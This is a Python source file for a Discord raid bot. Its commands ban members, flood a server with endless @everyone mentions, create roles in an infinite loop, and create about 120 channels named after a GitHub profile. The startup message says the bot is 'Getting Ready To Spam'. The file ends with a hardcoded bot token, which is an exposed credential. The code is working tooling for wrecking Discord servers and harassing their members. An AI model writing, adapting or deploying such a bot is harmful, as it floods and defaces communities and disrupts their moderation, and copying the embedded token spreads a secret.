import keep_alive
import discord
from discord.ext.commands import *
from discord.ext import commands
import random
import asyncio
import time
import json
from itertools import cycle
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get

 
##PREFIX##

bot = commands.Bot(command_prefix='!')

client = commands.Bot(command_prefix='!')

##OTHER##
bot.remove_command('help')



##BOT IS READY##
@bot.event
async def on_ready():
#BOT STATUS#
    print("Bot Is Online! Getting Ready To Spam.")
    print(f"Bot Status: Online!...")



##BAN COMMAND##
@bot.command(pass_context=True)
async def ban(ctx, member : discord.Member):
    await member.ban()
    await ctx.message.delete()

 
##SPAM COMMAND##
@bot.command(pass_context=True)
async def spam(ctx): #run "!spam" to run the command
    await ctx.message.delete()
    while True:
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send(
            "@everyone\n@everyone\n@everyone\n")
        await ctx.send("@everyone")


##SPAM ROLE##
@bot.command(pass_context=True)
async def roles(ctx):
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name=" スマイル")



##MAKE CHANNELS##
@bot.command(pass_context=True)
async def channels(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')
    await guild.create_text_channel('https://github.com/Uunkn0wnN')





##BOT TOKEN##
keep_alive.keep_alive()
bot.run ("OTEwNzcxODQyNzc4Nzk2MDQy.YZXsYA.uJwr5vd3j4SRZ4rSIXk5cJGwRiA")